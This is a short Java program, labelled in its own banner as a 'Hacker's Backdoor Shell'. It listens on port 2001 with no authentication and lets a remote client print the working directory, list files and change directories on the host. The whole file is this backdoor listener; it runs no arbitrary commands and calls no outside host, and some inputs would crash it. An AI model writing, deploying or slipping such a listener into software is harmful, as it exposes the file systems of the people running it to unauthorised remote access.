import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOError;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class ConsoleDemo {

	public static void main(String[] args) {
		
		try {
			ServerSocket server=new ServerSocket(2001);
			Socket client=server.accept();
			String workingDir=System.getProperty("user.dir");
			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
			System.out.println();
			
			//File workDirectory=System.getProperty(null)
			
			InputStream in=client.getInputStream();
			OutputStream out=client.getOutputStream();
			
			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
		
			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
			
			while(true) {
				
				writer.write("\n\r"+workingDir+prompt);
				writer.flush();
				String clientCommand=reader.readLine();
				
				if(clientCommand.equalsIgnoreCase("pwd")) {
					writer.write("\nWorking directory is: "+workingDir+"\n\n");
				}
				else if(clientCommand.equalsIgnoreCase("dir")){
					
					File currentDirectory=new File(workingDir);
					File[] allFiles=currentDirectory.listFiles();
					
					for(File f:allFiles) {
						writer.write("\n\r"+f.getName()+(f.isDirectory()?" - Directory":" - File"));
					}
					
				}
				else if(clientCommand.startsWith("cd")) {
					String directory=clientCommand.split(" ")[1];
					File tempWorkingDir;
					
					
					if(directory.equalsIgnoreCase("..")) {
						tempWorkingDir=new File(workingDir).getParentFile();
					}
					else{
						tempWorkingDir=new File(workingDir+File.separator+directory);
					}
					
					
					
					if(tempWorkingDir.isDirectory()) {
						workingDir=tempWorkingDir.getAbsolutePath();
					}
					else {
						writer.write("\n\r Directory does not exist!\n\r");
					}	
					

				}
				
			}
			
			

		}
		catch(IOException e) {
			e.printStackTrace();
		}
		

	}

}


